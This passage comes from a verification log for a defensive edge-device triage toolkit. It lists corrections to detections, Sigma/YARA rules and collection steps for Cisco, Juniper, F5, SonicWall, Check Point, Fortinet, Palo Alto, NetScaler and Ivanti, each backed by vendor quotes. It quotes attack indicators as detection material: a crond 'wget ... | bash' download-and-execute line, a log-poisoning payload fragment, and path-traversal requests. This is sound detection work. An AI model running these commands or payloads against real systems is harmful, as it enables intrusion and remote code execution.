| checkpoint-gaia profile `date_utc`, `uptime`, `ps` | confidence high | medium | No Check Point document cited for these commands; CLAUDE.md provenance rule. |
| junos profile: new step `jweb_php_log` (P4, low/unverified) + allow rule for that one path | "the profile has no read-only command for it" | `file show /var/jail/sess/php.log \| no-more`. junos-jweb-php-log-anonymous now reads it. | Juniper "Display System Log Files": "file show log-file-pathname"; path from watchTowr: "the PHP log (/var/jail/sess/php.log)". |
| EDGE-PACK-0020 new detection `junos-jweb-php-log-session-null` (possible) | - | `[message] => Trying to access array offset on value of type null` | watchTowr: "[message] => Trying to access array offset on value of type null [file] => /html/core/session.php" / "while not conclusive, may indicate an attack is being attempted". |
| EDGE-PACK-0010 new detection `junos-tinyshell-mandiant-hunting` (likely) + 09-juniper-junos/junos_tinyshell_mandiant_hunting.yar | Only toolkit-written strings rule | Mandiant's published rules M_Hunting_TINYSHELL_5 and M_Hunting_PacketEncryptionLayer_1, copied from the saved report | Mandiant UNC3886 Junos report (saved dl/unc3886.txt), YARA section, `author = "Mandiant"`. |
| 10-f5-bigip: new Sigma f5_tmsh_run_util_bash_hubble.yml linked from `f5-hubble-util-bash-audit` | Detection linked the `run util bash -c` rule, which does not match F5's sample | New rule: `user=f5hubblelcdadmin` AND `cmd_data=run util bash` | K000160486: "user=f5hubblelcdadmin folder=/Common module=(tmos)# status=[Command OK] cmd_data=run util bash <VARIABLE_COMMAND>". |

#### Corrections to facts, attribution and wording

| Item | Was | Now | Basis (source + verbatim phrase) |
|---|---|---|---|
| ASA catalog artifact 1 normal/suspicious | "two, or occasionally five, executable lina regions can be normal" | Normal: one r-xp region; NCSC's 2 or 5 counts regions of all permissions. Suspicious: more than one r-xp region, especially one of 0x1000 bytes. | NCSC TIP (above). |
| ASA catalog collection + new artifact | Core dump only; the alert as reference | New collection row and artifact for CISA's grep. The core dump row describes CISA's reloads and adds the Firepower dump requirement. References: Supplemental Direction, ED 25-03, NCSC MAR; the alert is kept as a pointer only. | CISA Supplemental Direction; RayDetect README: "The script CANNOT detect RayInitator within core dumps for Firepower devices". |
| ASA catalog anti_forensics | No LINE VIPER entries; FXOS "removed only by a cold restart" | Five LINE VIPER entries (dump reboot, copy reboot, forged verify hash, delayed forced reboot of 1-10 h, CLI command harvesting). FXOS: reimage is Cisco's recommendation and a cold restart also removes it. | NCSC MAR: "force a delayed reboot"; "observed ranging between one and ten hours"; "harvest user CLI commands". Cisco persist advisory: "To fully remove the persistence mechanism, Cisco strongly recommends reimaging and upgrading the device". |
| EDGE-PACK-0018 summary, implants, references, notes | "LINE VIPER ... suppresses syslog IDs and disables checkheaps"; "Cisco added an FXOS-level implant"; CISA spellings note | LINE VIPER suppresses 302013/302014/609002/710005 (NCSC). Cisco separately reports the actor disabled checkheaps. "Cisco disclosed ... (Talos: FIRESTARTER)". CISA uses the same name, firmware_update.log, and adds 5585-X. Checkheaps note cites CISA's five-minute procedure. Implants: RayInitiator, LINE VIPER, FIRESTARTER. | Cisco detection guide: "This threat actor has been observed to disable the checkheaps function."; CISA: "check disk0:for a file named firmware_update.log". |
| EDGE-IMP-0013 | name "FXOS lina_cs implant", type persistence-mechanism, resides disk, FIRESTARTER read "only through a summariser" | name FIRESTARTER (id kept), alias FXOS lina_cs implant, type backdoor, resides memory+disk. Adds the Talos persistence behaviour, the two FXOS paths (with a gap: not visible from the ASA CLI), CISA's keep-powered-on advice, and references to Talos and CISA/NCSC AR26-113A. | Talos: "custom-built backdoor dubbed "FIRESTARTER""; "The persistence mechanism triggers during graceful reboot"; AR26-113A (read live) titled "FIRESTARTER Backdoor". |
| EDGE-IMP-0004 RayInitiator | detections [] and a gap saying only a core dump detects it | Detections [asa-lina-text-implant-grep]; the gap says LINE VIPER has an on-box check and RayInitiator still needs the dump. LINE VIPER anti-forensics added; references point to the Supplemental Direction and ED 25-03. | RayDetect README (above). |
| EDGE-TA-0003 | stated_confidence 'a state-sponsored actor'; first_seen 2024-01; reported_by Microsoft; packs/implants missing 2025-26 | Full Talos sentence; first_seen 2023-11 with a July 2023 testing note; reported_by Cisco Talos only, and STORM-1849 marked as Microsoft's name as given by Talos; alias UAT-4356; EDGE-PACK-0018 and EDGE-IMP-0013 added; FIRESTARTER tradecraft | Talos: "we assess with high confidence that these actions were performed by a state-sponsored actor"; "infrastructure dating back to early November 2023"; "as early as July 2023". |
| ASA response | Cited the alert; "CISA directed replacement" | New preserve step (keep the device powered on, disconnect). New do_not entries (copy or verify system:/text before the live steps; trusting a matching verify hash). RayInitiator eradicate and do_not text follow ED 25-03's actual wording. vendor_guidance lists the Supplemental Direction and ED 25-03 first. | CISA: "If core dump results indicate compromise, keep the device powered on, immediately disconnect the device from the network"; ED 25-03: "immediately disconnect the device from their network (but do not power off)"; "Permanently disconnect these devices on or before September 30, 2025". |
| ASA hardening | summary/secure-boot "not seen ... on Secure Boot platforms" (undated); control-plane ACL "a control-plane access list does"; webvpn "Cisco gives no commands" | Secure Boot statement dated 2025, with the April 2026 FXOS persistence added. The control-plane note says http/ssh/telnet statements take precedence over it. Cisco's `no webvpn` and `crypto ikev2 enable <interface_name>` quoted. New control asa-persist-fixed-release-reimage. | Cisco event response (saved): "To disable all SSL VPN services, run the no webvpn command"; "Disable IKEv2 client services by repeating the crypto ikev2 enable <interface_name> command"; persist advisory quote above; Cisco ASA hardening guide (Dutch) on control-plane precedence. |
| 05-cisco-asa-ftd Sigma CVE-2023-20269 + EDGE-PACK-0019 note | "A termination carrying byte counts means a session existed" | Labelled as the toolkit's inference; adds Cisco's "9.16 or earlier" scope | Cisco advisory (saved): "Establish a clientless SSL VPN session (only when running Cisco ASA Software Release 9.16 or earlier)". |
| EDGE-IMP-0011 / EDGE-PACK-0011 | No alias; "accepted an X-Csrf-Token header from 2 November 2023" | Alias BadCandy (Talos). Third version "discovered by Talos on 2 November 2023"; second "likely started to be deployed as early as Oct. 20" | Talos: "an implant we're calling "BadCandy""; "On November 2, Talos discovered a third version of BadCandy". |
| EDGE-PACK-0011 config-programmatic note; IOS XE catalog show logging | "Cisco's hunting string" | Quotes Cisco's note that the indicator is a new or unknown username; WEBLOGIN_SUCCESS added to suspicious | Cisco advisory: "The indicator to look for is new or unknown usernames present in the message." |
| IOS XE catalog notes / smaps artifact / dir_all artifact | "there is no pack for it yet" (CVE-2025-20352); rwxp only; dir_all high | "see EDGE-PACK-0021"; r-xp or rwxp; dir_all medium | Repository; forensic guide footnote. |
| IOS XE hardening summary | "reached tens of thousands of devices" | Figure dropped | No count in the cited sources. |
| EDGE-IOC-0009 account context | "Hidden account name observed by Trend" | Adds that the names come from the blog body at page_url; the IoC file carries only hashes | Trend IoC file contains nine SHA256 lines only. |
| SMA response eradicate + notes | "GTIG names 10.2.1.15-81sv as the fixed release" | Rebuild at 10.2.2.2-92sv or later (SNWLID-2025-0015). 10.2.1.15-81sv is the release GTIG's victims already ran. | GTIG (confirmed): "prior to the targeted SMA appliance being updated to the latest firmware version (10.2.1.15-81sv)"; SNWLID-2025-0015: "upgrade to the 10.2.2.2-92sv version". |
| SMA response credential_exposure, verify, vendor_guidance | VPN creds/OTP and local admin only; "ransomware staging was the suspected objective"; dead product-notification URL | Adds certificates in /etc/EasyAccess/var/cert, temp.db sessions, and AD/LDAP passwords. GTIG's moderate-confidence aim is quoted. Guidance now cites SNWLID-2025-0015, SNWLID-2024-0018 and the Japanese-locale notice. | GTIG: "Revoke and reissue any certificates with private keys stored on the appliance"; dopasswords tar list; SonicWall notice (Japanese) on local, AD and LDAP passwords. |
| SMA hardening sma-upgrade-rebuild + header | "Upgrade to 10.2.2.1-90sv or later"; JP copy "published 2025-08-01" | 10.2.2.2-92sv or later, confidence high, with English PSIRT sources (2025-0015, 2025-0014, 2024-0018). Header now reads "published 2025-07-31, updated 2025-08-02". | SNWLID-2025-0015 quote; SNWLID-2025-0014 "10.2.2.1-90sv and higher versions"; SNWLID-2024-0018 "10.2.1.14-75sv and higher versions" (saved JSON). |
| SMA catalog | ld.so.preload normal "typically absent or empty" | Normal: absent, or 2 bytes or fewer. Suspicious: more than 2 bytes. New /cf artifact. rc.fwboot note says only GTIG's hash marks the modified file. SNWLID-2025-0015 added as a reference. | GTIG (above). |
| EDGE-TA-0004 stated_confidence/motivation | Said the 'moderate confidence' statement concerns only zero-day use; motivation financial unqualified | stated_confidence quotes 'a suspected financially-motivated threat actor', both moderate-confidence statements and the Abyss overlap. motivation stays financial (the enum has no hedge; the repository convention keeps the hedge in stated_confidence, as for UTA0576), and a notes field says so. | GTIG (confirmed by main session). |
| EDGE-IMP-0007 | "Activity since at least October 2024"; survives_upgrade unknown, no note | UNC6148 activity since October 2024; OVERSTEP deployment June 2025. Notes 10.2.2.2-92sv rootkit removal and SonicWall's clean-rebuild statement. New artifacts and detections listed. | GTIG; SNWLID-2025-0015: "additional file checking, providing the capability to remove known rootkit malware". |
| EDGE-IOC-0008 roles/staleness | Three IPs and the bare rc.fwboot path were `actor-controlled`; "February and June 2025", "rented VPS" | All four set to `unknown`. The rc.fwboot context says only the hash is an indicator. Staleness reads February to July 2025 and "BitLaunch (BLNWX) VPS". | GTIG table: "Identified by SonicWall as triggering the OVERSTEP backdoor in July 2025"; "used by UNC6148"; "a BitLaunch (BLNWX) VPS". |
| EDGE-PACK-0022 summary/references | "GTIG found no evidence UNC6148 used this chain"; old Arctic Wolf URL; no SonicWall advisory for CVE-2024-38475 | Names watchTowr's CVE-2024-38475 + CVE-2023-44221 chain; canonical Arctic Wolf URL; SNWLID-2024-0018 added | GTIG: "we did not identify any evidence suggesting this bug chain was used by UNC6148". |
| Check Point hardening cp-ra-vpn-ikev2-certs + response contain | Option 1 = VPN Clients > Authentication only | Also Mobile Access > Authentication when enabled. Options 1 and 3 do not apply to locally managed Spark, which uses the Spark WebUI IKEv2 setting. | sk185033 (live): "If Mobile Access is enabled: ... go to Mobile Access > Authentication and clear the Allow older clients to connect to this gateway checkbox"; "This mitigation option is not relevant for locally managed Spark Firewall." |
| Check Point hardening other | cp-admin-mfa quote truncated with an added period; LOM sentence cited to the wrong page; blunts missing CVE-2026-16232 | Full sentence quoted; Gaia OS hardening page added for the LOM line; CVE-2026-16232 and sk185169 added to cp-mgmt-behind-gateway and cp-trusted-clients | sk185169: "Successful remote exploit requires internet access to the Management Server IP address and no restrictions on Trusted Clients (GUI clients)." |
| "Check Point says patching does not reveal earlier compromise" (response preserve_first and do_not, 07 README, EDGE-PACK-0013 summary) | Attributed to Check Point | Reworded as the toolkit's own guidance | Not on sk1000171 or the blog; nearest: "A match does not necessarily confirm successful compromise." |
| EDGE-PACK-0013 summary CVE-2026-16232 | "a very small number of customers" | "exploited in the wild, affecting a handful of customers with a very specific configuration" | sk185169 (saved). |
| 07 Sigma 85102 cert-subject description | "against Spark and Quantum gateways" | Against Spark customers; Quantum affected but no exploitation reported; blog added | sk1000117: "actively exploited on Spark Firewalls as of September 12, 2026". |
| 07 Sigma 16232 references | sk1000171 and the 85102/93616 blog | sk185169 only; both queries described | Neither cited page mentions CVE-2026-16232. |
| Check Point response credential_exposure | sk182336 list partial | Adds Azure HA credentials, Gaia snapshot and backup passwords, Log Exporter and Identity Broker certificates, "see sk182336 for the full list" | sk182336 items 9, 12, 13, 15, 16. |
| EDGE-PACK-0009 note | "the successful aCSHELL read does not produce 'Invalid filename'" | What the successful read logs "is not published" | watchTowr shows Invalid filename only for a rejected ../../etc/passwd. |
| F5 hardening f5-httpd-allow | blunts CVE-2022-1388; "CISA's CVE-2022-1388 mitigations included modifying the httpd configuration" | No blunts. The text quotes F5's statement that an httpd IP allow-list "is not a viable mitigation". New control f5-httpd-1388-header points to K23605346's include-statement procedure without copying the version-specific text. | K23605346 (live): "Restricting access to the management interface by IP address in httpd is not a viable mitigation for this issue." / "you can modify the BIG-IP httpd configuration to mitigate this issue." |
| F5 hardening other | pt_br blog URLs for English quotes; "default for a new self IP"; "all give this as the first control"; ED 26-01 decommission unqualified; us-cert AA22-138A URL | English blog URL. Default claim dropped and K23605346 quote added. "among their first actions". ED 26-01 quoted for public-facing EoS devices with the cisa.gov directive as source. AA22-138A on cisa.gov. | K23605346: "you can change the Port Lockdown setting to Allow None for each self IP address in the system."; ED 26-01: "For all public-facing F5 devices that have reached end of support, disconnect and decommission these devices." |
| F5 System Scanner text (profile header and system_scanner step, catalog, response, 10-f5 README, EDGE-IMP-0012 gap) | "run from known-good media"; --scan-procs/--scan-all-procs "the only vendor check that reaches the in-memory webshells" | Downloaded from MyF5, manifest checked with sha512sum, run on the device from /var/tmp/scanner. --scan-procs covers deleted executables only; --scan-all-procs hashes in-memory binaries. F5 does not say either detects the webshells. Supported-version, Appliance-mode and --sha256 limits added. | K000160515 (live): "Scans only process executables that have been deleted from the disk (unlinked)."; "The process scan reads binary content directly from /proc and generates a SHA-512 hash"; "Login to the BIG-IP host as root using SSH"; "cannot be run on systems configured in Appliance mode". |
| EDGE-IMP-0012 gap | "One secondary report says the sys-eicheck changes did not carry over an upgrade" | Removed (unnamed, unverifiable) | Not in K000160486, K000156741 or K000160515. |
| EDGE-PACK-0016 summary and f5-tmm-sigabrt note + 10-f5 Sigma f5_tmm_sigabrt.yml | "then a TMM SIGABRT" as if logged | F5's indicator is a TMM core file after SOD sends SIGABRT. The pattern is labelled toolkit inference and unverified. The tmm.finish lead (watchTowr, researcher technique) is added to the summary. | K000162605: "We have observed TMM enters a loop, which causes the SOD daemon to send a SIGABRT. Presence of a TMM core file alone is not an indicator"; watchTowr: "bash /etc/bigstart/scripts/tmm.finish". |
| 10-f5 Sigma f5_rest_util_bash_post.yml, f5_tmsh_run_util_bash.yml | Tagged cve.2023-46747 (and 53521 on the tmsh rule) | Tag cve.2022-1388 only, citing K23605346 | K000137353 defers indicators to K000137365 (catalina.out lines only). |
| EDGE-PACK-0015 summary | "F5 credits Schuberg Philis, Fox-IT and NCSC-NL" | "F5 thanks Schuberg Philis, Bart Vrancken, Fox-IT and NCSC-NL for assistance in investigating the issue" | K000156741. |
| F5 catalog/profile/EDGE-PACK-0017/Sigma 46748 | "Column not found: 0." as fixed | Note that the number varies | K000137365: "In the line of Column not found: 0, the 0 can be replaced with a different number." |
| F5 K11438344 title (catalog, response) | "checking a BIG-IP system for compromise" | "Considerations and guidance when you suspect a security compromise on a BIG-IP system" | F5 page title. |
| Junos: attribution of anti-forensics (EDGE-PACK-0010, catalog anti_forensics and artifacts, profile, EDGE-IMP-0010, EDGE-TA-0006 tradecraft) | "UNC3886's session scripts", "the actor's commands" | lmpad backdoor's embedded script (commands 0/1, 6/7) and command 2 sed calls; hands-on operator actions listed separately | Mandiant (saved dl/unc3886.txt): "The main purpose of this malware is to disable all possible logging before the operator connects"; "Command 2 ... launches a series of sed commands to remove specific lines from log files". |
| Junos show system commit + new catalog artifact /var/rundb+ and /usr/lib/libjucomm.so.1 | Commit history treated as reliable | Can be rewound by lmpad backup/restore; new artifact (manual, researcher); /root/.history line deletion noted | Mandiant backup(): "cp /var/db/commits /usr/lib/libjucomm.so.1"; restore(): "cp /usr/lib/libjucomm.so.1 /var/db/commits". |
| Junos login-record and usage_db wording | "edited the originals"; "Mandiant notes the script overwrote it"; usage_db "only after an interrupted session" | Script restored wtmp from wtmp0 and, per its code, re-copied utx.log to utx.log0 (Mandiant's prose says both were restored). usage_db exists between backup and restore. | Mandiant post_ssh code: "cp -r /var/log/wtmp0 /var/log/wtmp cp -r /var/log/utx.log /var/log/utx.log0". |
| Junos payload-file location | "sat in a working directory named ldb" | loader.bin, pc.bin, payload.bin and the null FIFO were in a removed directory; no location given for ldb.b64 or ldb.tar.gz | Mandiant: "cd .. rm -rf ldb"; here-document passage gives no directory. |
| Junos J-Web (EDGE-PACK-0020, 09 README, catalog, profile, hardening) | "advisory needs a support login"; uploads were "watchTowr's CVE-2023-36846 reproduction"; upload directory "not confirmed"; catalog note "no pack yet" | JSA72300 (read live) cited and quoted: successful exploitation, the no-upload variant, and the web-management stanza. Uploads attributed to webauth_operation.php (JSA72300: CVE-2023-36851) under /var/jail/tmp. Catalog note: KEV 2023-11-13 (kev.json) and EDGE-PACK-0020. | JSA72300: "Juniper SIRT is now aware of successful exploitation of these vulnerabilities."; "works without a previous file upload"; "[system services web-management http] or [system services web-management https]"; watchTowr: "cat /var/jail/tmp/48cebc0d...txt". |
| Junos hardening | Quotes cut mid-sentence; `lo0.0` syntax; dead Day One PDF | Quotes to sentence end; `set interfaces lo0 unit 0 family inet filter input <filter>`; dead link removed; JSA72300 added as a source | Juniper example: "set interfaces lo0 unit 0 family inet filter input limit-mgmt-access". |
| Junos JMRT integrity-check (catalog, profile purpose, test docstring) | "Writes and runs a test file" | Juniper's expected log message quoted; the test-file write labelled as inference | Juniper JMRT page: "MAC/veriexec: no fingerprint (file=/tmp/veriexec_test are expected to be seen". |
| EDGE-IOC-0007 eight TINYSHELL C2 IPs | role actor-controlled | role unknown; context and staleness quote the GOBRAT ORB statement | Mandiant: "Mandiant believes these IPs are staging nodes of a GOBRAT ORB network, eventually leading to a single, backend Adversary Controlled Operations Server". |
| 09 junos_unc3886_tinyshell.yar | meta cve = CVE-2025-21590; strings presented as Mandiant's file strings | cve meta removed; comment says Mandiant gives protocol constants, ASCII storage is an assumption, and the CVE is the injection technique | Mandiant: "This specific technique is now tracked as CVE-2025-21590". |
| EDGE-PACK-0010 / EDGE-IMP-0010 references; Mandiant titles | NVD for CVE-2025-21590; "(12 March 2025)" | JSA93446 and JSA95385 (RedPenguin) added; titles "(March 2025)" (page header 11 March, metadata 12 March) | Finding E#26/E#27 evidence. |

#### Earlier corrections reversed

These rows in docs/VERIFICATION.md were themselves wrong. They were not edited here; the main session should rewrite them.

| Item | Was | Now | Basis (source + verbatim phrase) |
|---|---|---|---|
| VERIFICATION.md line 23 "ASA region check tier" | "the detail now says 2 (occasionally 5) can be normal and asks for review" | NCSC's 2 or 5 is the count of lina regions of all permissions and "in itself is not an indicator of compromise". More than one r-xp region is the indicator; the detail text now says so. | NCSC LINE DANCER TIP (confirmed by main session). |
| VERIFICATION.md line 45 "SonicWall fixed firmware" | 10.2.2.2-92sv -> 10.2.1.15-81sv (GTIG) | Back to 10.2.2.2-92sv (SNWLID-2025-0015). 10.2.1.15-81sv is the release GTIG's victims had already been updated to. | GTIG: "prior to the targeted SMA appliance being updated to the latest firmware version (10.2.1.15-81sv)"; SNWLID-2025-0015: "10.2.2.2-92sv and higher versions". |
| VERIFICATION.md line 44 "UNC6148 / Abyss link" | "its 'moderate confidence' concerns zero-day use" | GTIG makes two moderate-confidence statements: zero-day use, and that operations "may be to enable data theft and extortion operations, and possibly ransomware deployment". It calls the actor "suspected financially-motivated". | GTIG (confirmed by main session). |
| VERIFICATION.md line 92 "EDGE-PACK-0009 vpnd detection" | Basis "Check Point sk182336 hunting guidance" | The string is from watchTowr's patch diff only; sk182336 does not contain it, and its log destination is unconfirmed | watchTowr (live) and sk182336 (saved). |
| VERIFICATION.md line 272 "firmware_update.log" | "CISA spells it firmwareupdate.log and firmware-update.log" | CISA's Supplemental Direction spells it firmware_update.log | CISA: "check disk0:for a file named firmware_update.log". |
| VERIFICATION.md line 111 "F5 System Scanner" | "--scan-procs named as the process check" | --scan-procs covers only deleted (unlinked) executables; --scan-all-procs hashes all in-memory binaries; neither is documented to detect the webshells | K000160515 (live). |
| VERIFICATION.md line 280-281 | "Juniper's JSA72300 needs a support login and was not read." | JSA72300 is public and was read on 2026-10-23 | JSA72300 (live). |

#### Rejected (not applied) and why

| Item | Was | Now | Basis (source + verbatim phrase) |
|---|---|---|---|
| E#2 partial: a TMM core-file listing step (e.g. `ls -lt /var/core`) | - | Not added | No F5 article read in this pass confirms the core-file path; "omit rather than guess". The detection is relabelled as inference instead. |
| E#14 partial: a coded check on /etc/bigstart/scripts/tmm.finish | - | Recorded as a manual lead in the EDGE-PACK-0016 summary only | The profile does not collect the file and there is no known-good baseline in the case; a detection would always be not-evaluated. |
| E#0 partial: copying K23605346's httpd include-statement block into the hardening control | - | The control points to the article and does not reproduce the steps | The live fetch returned the procedure fragmented (the tmsh command line was missing) and the steps vary by version, so a copied block could be wrong. |
| C#20 optional: adding %ASA-4-722041 | - | Not added | Its only source is Rapid7's secondary blog; Cisco's advisory does not list it. |
| C#21 partial: BadCandy alias in EDGE-IOC-0005 | - | Not added to the IOC file | The IOC set's text is parsed from the publisher. The alias is on EDGE-IMP-0011 and EDGE-PACK-0011. |
| D#4 literal fix "motivation: financial (suspected)" | - | motivation stays `financial`; the hedge is quoted in stated_confidence and explained in notes | The schema enum allows only espionage/financial/unknown/mixed, and the repository convention (UTA0576) keeps the hedge in stated_confidence. |
| D#16 detection-level low/unverified for checkpoint-vpnd-traversal-blocked | - | The low/unverified flag went on the catalog artifact; the detection carries it in notes | The pack schema has no per-detection confidence field. |

### PAN-OS, FortiOS, Ivanti, NetScaler, hunts, baseline controls and the guide

Pass date 2026-10-23. Findings: findings-A-panos-fortios.json (42 issues), findings-B-ivanti-netscaler.json (38), findings-F-crosscutting.json (24). docs/VERIFICATION.md and CHANGELOG.md not edited.

#### Corrections that changed detection or collection behaviour

| Item | Was | Now | Basis (source + verbatim phrase) |
|---|---|---|---|
| EDGE-PACK-0003 fortios-sslvpnd-crash / new fortios-crashlog-sslvpnd-segv (A3) | same-line regex applied to the crashlog step (never fires there; step counted as evaluated) | log_regex keeps the event-log form only (steps: log_export); new coded check fortios_crashlog_sslvpnd_segv pairs "application sslvpnd" and "*** signal 11 (Segmentation fault) received ***" rows sharing the process token; not-evaluated on zero rows; test feeds the tech tip's published rows | Fortinet tech tip (re-read): "diagnose debug crashlog read ... xxxx: [ Date & Time ] <.....> application sslvpnd / xxxx: [ Date & Time ] <.....> *** signal 11 (Segmentation fault) received ***"; event log: Logdesc="Application crashed" and msg="[...] application: sslvpnd,[...], Signal 11 received" |
| edgetriage/checks/fortinet.py fortios_symlink_to_root; catalog fortios.yml language-directory artifact (A5) | any link in the language listing scored (likely); normal "Regular files from the release" (basis vendor) | in that listing only links other than custom -> /data2/custom_lang score; rootish scoring limited to the language and /data listings (binary dirs are links to /bin/init); catalog normal/suspicious rewritten, basis researcher, low/unverified kept; test for clean custom link | Researcher Fortinet credits (pgj11.com, re-read): "lrwxrwxrwx ... custom -> /data2/custom_lang"; "there is always custom pointing to /data2/custom_lang"; "What attackers did is modify the symbolic link /migadmin/lang/custom to point to the root of the FortiGate" |
| collectors/profiles/fortios.yaml listing_sslvpn_lang (A21) | no var_examples; vendor blog only | var_examples {sslvpn_lang_dir: /migadmin/lang}; researcher post and FG-IR-25-934 cited; still operator-supplied, low/unverified | pgj11.com: "As we saw in the languages directory of VPN-SSL (/migadmin/lang) there is always custom pointing to /data2/custom_lang." |
| fortios.yaml new steps listing_data_lib, listing_var, listing_data_etc, listing_root; PACK-0003 new fortios-42475-ioc-files (A23, A24) | no listing of Fortinet's IOC directories; listing_data described as "Listed in the vendor's IOC tech tip" | four vendor listings added (confidence medium: vendor-documented, output format not shown by vendor); allow rule for exactly 'fnsysctl ls -la? /'; log_regex (likely, filesystem) on the eight published paths; listing_data purpose says /data is toolkit choice | Tech tip (re-read): "fnsysctl ls -l /data/lib ... /data/lib/libips.bak /data/lib/libgif.so /data/lib/libiptcp.so /data/lib/libipudp.so /data/lib/libjepg.so; fnsysctl ls -la /var /var/.sslvpnconfigbk; fnsysctl ls -l /data/etc /data/etc/wxd.conf; fnsysctl ls -l / /flash" |
| fortios.yaml new steps listing_bin, listing_data_bin, tcpsock, proc_dump_init; PACK-0003 new fortios-coathanger-smartctl, -httpsd-socket, -preload-map; EDGE-IMP-0009 artifacts/detections/gap (A4) | "Hidden files and processes ... not reachable through the customer CLI"; gap "Coverage depends entirely on a baseline" | advisory's CLI indicators listed; read-only steps added (medium; allow rules 'diagnose sys tcpsock' and 'diagnose sys process dump \d+'); smartctl not a symlink (likely), established socket of process httpsd (possible: the genuine web daemon shares the name), deleted /lib/preload.so etc. in the PID 1 map (likely); gap rewritten (names vary; .bd.key hidden from listings) | MIVD/AIVD advisory (saved PDF text): "With access to the CLI of a FortiGate device, the presence of COATHANGER can be detected in three ways."; "fnsysctl ls -la /bin / fnsysctl ls -la /data/bin"; "any suspicious outgoing connections to external IP addresses from a process called httpsd is a strong indicator"; "If the memory map contains deleted entries linked to /lib/preload.so, this is a strong indicator of the presence of COATHANGER." |
| PACK-0024 new fortios-41328-lspci-symlink, fortios-41328-castletap-fgfm on listing_bin (A40) | no detection for Mandiant's file indicators | two log_regex detections (likely, persistence) on fnsysctl ls -la /bin | Mandiant (saved copy): "Fortinet confirmed that /bin/lspci should always be a standalone binary."; "lrwxrwxrwx 1 root root 11 Oct 19 05:11 lspci -> /bin/sysctl"; "identified an additional malicious file /bin/fgfm" |
| fortios.yaml header (A37 part) | no privilege note | fnsysctl needs super_admin (verbatim quote) | Tech tip (re-read): "The ' fnsysctl' command will only work when logged in as a super_admin (administrator accounts with super_admin permission profile)." |
| EDGE-PACK-0001 panos-3400-crond-download-exec sources; catalog panos.yml "show log system" artifact; new catalog artifact /var/log/syslog-system.log (A12) | crond lines claimed in `show log system`; detection read step show_log_system | step removed (TSF file glob **/syslog-system.log* kept); catalog row for the TSF file added (basis researcher); fixture moved the crond line into the TSF and tests now expect not-evaluated from CLI alone and a hit from syslog-system.log | Volexity 15 May 2024 (re-read): "This log file is located at /var/log/syslog-system.log and contains various entries related to crond executions"; "Apr 10 02:16:01 <REDACTED>crond[18423]: (root) CMD (wget -qO- http://172.233.228.93/policy \| bash)" |
| 01-panos-globalprotect/panos_upstyle_backdoor.yar PANOS_UPSTYLE_Payload (A10) | strings 'img\[' and 'os.utime' attributed to Volexity | rule uses Volexity's published apt_malware_py_upstyle strings and stage condition, credited with rule_id and licence link; loader rule labelled a toolkit heuristic | Volexity rules.yar: $stage1_str1 = "/opt/pancfg/mgmt/licenses/PA_VM" ... $stage3_str2 = "SHELL_PATTERN"; neither 'img\[' nor 'os.utime' appears |
| EDGE-PACK-0028 netscaler-pitboss-log-poisoning; 04-citrix-netscaler/netscaler_cve_2026_88771_pitboss_log_poisoning.yml (B0, B9, B10) | pattern 'pitboss PPE (unexpectedly died | missed too many heartbeats\s?)NSPPE(-00)?;.+' (never matched Rapid7's "unexpectedly died NSPPE;"); "A genuine pitboss line does not continue after the semicolon"; falsepositives "None expected"; "crash-handling Perl script" | 'pitboss PPE (unexpectedly died\|missed too many heartbeats)\s?NSPPE(-00)?;.+' in both; test feeds Unit 42's and Rapid7's forms with an inert payload and pins Sigma = pack; benign-format claim marked toolkit inference; falsepositives "Unknown"; script named /netscaler/ns_monuploadd_err.pl, "crash handler" credited to Rapid7\|Rapid7 (re-read): "the NetScaler call-home crash handler processed the retained attacker-controlled text and executed a payload as root"; finding: Rapid7 "pitboss PPE unexpectedly died NSPPE;fetch${IFS}..."; Unit 42: "pitboss PPE missed too many heartbeatsNSPPE;<additional text>", "processed by the vulnerable Perl script at /netscaler/ns_monuploadd_err.pl" |
| EDGE-PACK-0028 netscaler-slap-framework-dir; new netscaler-nsvm-flash-dir, netscaler-rc-netscaler-nsvm, netscaler-var-tmp-staging; netscaler.yaml new step listing_flash (B8) | only /nsconfig/.slap checked | .slap or .relay; new read-only step `shell ls -la /flash` (medium; passes the existing ls grammar) with .nsvm detection; rc.netscaler naming .nsvm/nsvmd; .ux, .s2loot, .uxdport, .uxdlock in the /tmp,/var/tmp listing; .deb-named shells recorded as not checked (on-disk path unpublished); tests added | Rapid7 (re-read): "The installer created a 45s watchdog (/flash/.nsvm/watchdog.sh), boot persistence through /nsconfig/rc.netscaler, ... marking nsvmd immutable using chflags uchg."; "recorded it in /tmp/.uxdport"; "/tmp/.uxdlock"; IOC table per finding: "/nsconfig/.relay/ \| Relay implant directory", "/var/tmp/.s2loot/ \| Loot staging directory" |
| EDGE-PACK-0005 netscaler-auth-nonprintable (check, Sigma, references) (B3) | any LOGIN_FAILED/"Authentication is rejected" line with any non-printable byte anywhere; Huntress + ReliaQuest | check and Sigma score the vendor form ("AAA Message" ... "Authentication is rejected for " then bytes 0x80-0xFF after the marker) and Huntress's LOGIN_FAILED ... User <unprintable>; vendor blog added as primary; ReliaQuest kept for session reuse only and dropped from the Sigma rule; test added | NetScaler (15 Jul 2025): "Search for log lines containing /\"Authentication is rejected for / AND /AAA Message/ AND bytes containing non-ASCII characters (range 128-255)"; Huntress: "5937 AAA LOGIN_FAILED events ... Every one of them carried a bizarre, unprintable User value" |
| EDGE-PACK-0007 ivanti-totp-traversal, ivanti-traversal-to-injectable-endpoint; both 03-ivanti-connect-secure Sigma rules (B28, B29) | only /api/v1/totp/user-backup-code/ with ../ or %2e%2e; Volexity 18 Jan 2024 and CISA AA24-060B cited for the path; falsepositives "None expected"; assetnote.io URL | second prefix /api/v1/cav/client/status/ and mixed encodings (.%2e, %2e.); Volexity 18 Jan / CISA dropped from the rules (Assetnote/Searchlight and Volexity 10 Jan cited); falsepositives "Vulnerability scanners and public proof-of-concept use (attempts, not success)"; URL now slcyber.io; test feeds both published payloads | Assetnote: "GET /api/v1/cav/client/status/../../admin/options" and "GET /api/v1/totp/user-backup-code/../../system/system-information"; Volexity 18 Jan 2024 post has no 'totp' or 'keys-status'; AA24-060B has neither |
